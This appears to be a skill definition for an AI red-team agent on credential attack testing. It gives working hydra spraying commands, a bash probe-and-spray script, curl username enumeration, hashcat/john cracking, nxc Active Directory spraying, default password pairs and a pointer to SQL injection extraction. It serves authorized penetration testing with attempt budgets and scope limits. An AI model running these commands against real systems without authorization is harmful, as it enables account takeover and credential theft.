---
name: credential-attacks
description: Test default credentials, password spraying, lockout behavior, password policy, hashes, and credential reuse within strict budgets
origin: RedteamOpencode
---

# Credential Attack Testing

## When to Activate

- Login, LDAP, SMB, SSH, database, API-key, or administrative authentication is exposed
- Reuse candidates from engagement intel before allocating online attempts
- Recovered hashes, credential dumps, or exposed configuration require bounded validation

## Tools

`run_tool hydra`, `run_tool nxc`, `run_tool ldapsearch`, `run_tool hashid`, `run_tool hashcat`, `run_tool john`, `run_tool curl`; host `jq`, `python3`.

## Methodology

### 1. Enumerate Policy Before Guessing

Inspect LDAP/domain policy first, then use `run_tool curl` for at most two invalid logins on one disposable account and compare lockout response behavior.

```bash
run_tool ldapsearch -x -H ldap://HOST -s base -b "BASE_DN" lockoutDuration lockoutObservationWindowThreshold maxPwdLockoutCount minPwdLength
run_tool nxc ldap HOST -u USER -p PASSWORD --users --pass-pol
```

Record threshold, observation window, duration, reset behavior, per-user versus per-source controls, and whether failures reveal valid users. Never use a real or unknown account to test lockout duration.

### 2. Enforce the Engagement Budget

Cap this skill at 300 total online authentication attempts per engagement. Keep the first batch below 20 attempts, use one thread, add a conservative delay, and stop immediately on lockout, CAPTCHA, or service instability.

Never run a wordlist larger than 500 entries. Escalate any plan requiring more than 500 entries to the `fuzzer` subagent; do not simulate that volume here. Offline cracking does not consume the online-attempt cap, but remains bounded to the saved candidate set.

### 3. Test Default and Weak Credentials

Use only a small candidate list: `admin:admin`, `admin:password`, `admin:123456`, `root:root`, `root:toor`, `test:test`, `guest:guest`, `user:user`, and engagement-derived pairs. Exclude the target's own username from spraying unless policy clearly permits it.

```bash
run_tool hydra -L "$DIR/scans/default-credentials.txt" -t 1 -W 5 "HOST" https-post-form "username=^USER^&password=^PASS^:Invalid credentials"
```

Keep the input file within budget. Stop on the first success per account and validate the session separately.

### 4. Spray Passwords, Not Accounts

Prefer one common password across a short, deduplicated username set. Reserve many passwords for one account only when lockout testing explicitly shows a safe budget.

```bash
run_tool hydra -L "$DIR/scans/spray-usernames.txt" -p 'CANDIDATE_PASSWORD' -t 1 -W 5 "HOST" https-post-form "username=^USER^&password=^PASS^:Invalid credentials"
```

Limit the file to the precomputed attempt count. Do not run brute force concurrently across users, hosts, or protocol modules.

### 5. Rate-Limit-Aware Credential Attacks

Before any spray, measure the lockout/throttle surface with deliberately invalid attempts: at most 3 per account and at most 2 accounts. Set the spray ceiling from the observed threshold rather than guessing.

Hard-cap any spray at one pass and at most 5 candidates per username, and stop on the first success. If no lockout exists, report `no rate limiting / account lockout on authentication endpoints` as its own finding with evidence instead of silently consuming the spray. If lockout exists, stop before triggering it, report the lockout policy as a control, and switch to a targeted list of usernames already discovered in-scope. Never spray third-party or out-of-scope authentication endpoints; keep engagement-local wordlists under `$DIR/scans/`.

```bash
MAX_PROBES_PER_ACCOUNT=3
MAX_PROBE_ACCOUNTS=2
MAX_SPRAY_CANDIDATES_PER_USERNAME=5
BASE="https://HOST"
PROBE_ACCOUNTS=(ACCOUNT_ONE ACCOUNT_TWO)
for account in "${PROBE_ACCOUNTS[@]}"; do
  for attempt in 1 2 3; do
    run_tool curl -sS --connect-timeout 5 --max-time 20 \
      -D "$DIR/scans/credential-probe-${account}-${attempt}.headers" \
      -o "$DIR/scans/credential-probe-${account}-${attempt}.body" \
      -d "username=${account}&password=WRONG_PASSWORD" "$BASE/LOGIN"
  done
done
if [ "${LOCKOUT_OBSERVED:-unknown}" = "no" ]; then
  printf '%s\n' 'Record finding: no rate limiting / account lockout on authentication endpoints; attach the probe evidence.'
  : > "$DIR/scans/local-candidates-max-5.txt"
  candidate_count=0
  while IFS= read -r candidate; do
    [ "$candidate_count" -ge "$MAX_SPRAY_CANDIDATES_PER_USERNAME" ] && break
    printf '%s\n' "$candidate" >> "$DIR/scans/local-candidates-max-5.txt"
    candidate_count=$((candidate_count + 1))
  done < "$DIR/scans/local-candidates.txt"
  run_tool hydra -f -L "$DIR/scans/targeted-usernames.txt" -P "$DIR/scans/local-candidates-max-5.txt" \
    -t 1 -W 5 "https://HOST/LOGIN" https-post-form "username=^USER^&password=^PASS^:Invalid credentials"
else
  printf '%s\n' 'Stop before lockout; report the policy and use the targeted in-scope username list.'
fi
```

### 6. Correlate Username Enumeration

Compare one known-invalid identity with one candidate identity using the same password. Correlate status, length, wording, redirect, MFA challenge, headers, cookies, and repeated timing; do not rely on a single timing sample.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -D "$DIR/scans/enum-known-invalid.txt" -o "$DIR/scans/enum-known-invalid-body.txt" -d 'username=KNOWN_INVALID&password=COMPARISON_PASSWORD' "https://HOST/LOGIN"
run_tool curl -sS --connect-timeout 5 --max-time 20 -D "$DIR/scans/enum-candidate.txt" -o "$DIR/scans/enum-candidate-body.txt" -d 'username=CANDIDATE&password=COMPARISON_PASSWORD' "https://HOST/LOGIN"
```

Write confirmed usernames and their source to `$DIR/intel.md`. Differing lockout policy is still an enumeration signal.

### 7. Evaluate Password Policy

Confirm minimum length, character-class requirements, common-password controls, history, expiration, and forced rotation from the policy output and user-facing flow. Confirm whether MFA, breached-password screening, or lockout compensates for weak composition rules.

Flag short minimums, no complexity or breached-password control, unlimited lifetime, and forced periodic rotation without actual reuse detection. Do not flag missing scheduled rotation when breach/reuse controls exist, and do not infer policy from one login response.

### 8. Identify and Crack Hashes

Identify hash types from the saved artifact, then select a verified mode. Common markers include `$2*$` for bcrypt, `$NT$` for NetNTLMv1, 32-hex MD4 responses for NTLM, `$1$`/`$5$` for crypt families, and `$argon2*` for Argon2.

```bash
run_tool hashid "$DIR/scans/hashes.txt"
run_tool hashcat -m 1000 -a 0 "$DIR/scans/hashes.txt" "$DIR/scans/candidate-passwords.txt" --potfile-path "$DIR/scans/hashcat.pot"
run_tool john --potfile="$DIR/scans/john.pot" --wordlist="$DIR/scans/candidate-passwords.txt" "$DIR/scans/hashes.txt"
```

Keep every potfile under `$DIR/scans/`. Treat NTLM, NetNTLM, and Kerberos input as username-bound; do not crack without the required account context.

### 9. Spray Active Directory

Use a deduplicated, policy-cleared list capped at the remaining online budget. Disable password spraying inside nxc and keep concurrency low.

```bash
run_tool nxc ldap HOST -U "$DIR/scans/ad-users.txt" -p 'CANDIDATE_PASSWORD' --no-bruteforce
run_tool nxc smb HOST -U "$DIR/scans/ad-users.txt" -p 'CANDIDATE_PASSWORD' --no-bruteforce
```

Stop on lockout thresholds. Reuse a successful pair only against explicitly in-scope services and only after deduplicating prior validations.

### 10. Reuse Engagement Intel

Correlate `$DIR/intel.md`, `$DIR/auth.json`, source artifacts, backups, configuration, tickets, and repository history. Test one high-confidence username/password pair per distinct service; prioritize privileged, service, and shared accounts.

### 11. Record Every Valid Credential

Write every valid credential to `$DIR/auth.json` and `$DIR/intel.md` immediately. Preserve the canonical top-level schema: `cookies`, `headers`, `tokens`, `discovered_credentials`, `validated_credentials`, and `credentials`.

Add valid entries to both `discovered_credentials` and the legacy `credentials` array; add only session-validated entries to `validated_credentials`. Preserve existing session objects, never overwrite them with a list, and record username, host, service, source, and scope in the intel row.

```bash
jq --arg user "$USERNAME" --arg pass "$PASSWORD" --arg service "$SERVICE" '.discovered_credentials += [{"username":$user,"password":$pass,"service":$service,"source":"credential-testing"}] | .credentials += [{"username":$user,"password":$pass,"service":$service,"source":"credential-testing"}]' "$DIR/auth.json" > "$DIR/auth.json.next" && mv "$DIR/auth.json.next" "$DIR/auth.json"
```

Move an entry to `validated_credentials` only after a successful login yields usable engagement auth context.

### Lab objective recall closure

When the active profile (`lab-profile.json`) lists schema/credential objectives, generic weak-credential proof is not enough. For a credential objective, requeue one exact native extraction workflow (credential-bearing config/backup/database dump, hash file plus account context, or an evidenced reusable-secret path), save the response artifact, and immediately run `python3 ./scripts/lab_objective.py snapshot "$DIR"` (or fetch the objective source). For a schema objective, requeue one exact native injection workflow with a `sqlite_master`/`information_schema` extraction payload, save the response artifact, and solved-check that branch separately. Do not close either branch as a generic credential finding until the handoff records `objective=<name> status=solved|requeued evidence=<path> next=<exact action>`. Consult the profile's `recall_branches` for the exact routes and payload hints.

## References

`references/vuln-checklists/A07-authentication-failures.md`, `references/tools/exploitation/hydra.md`, `references/tools/cracking/hashcat.md`, `references/tools/cracking/john.md`, `references/offensive-tactics/credential-access/credential-theft-misc.md`.
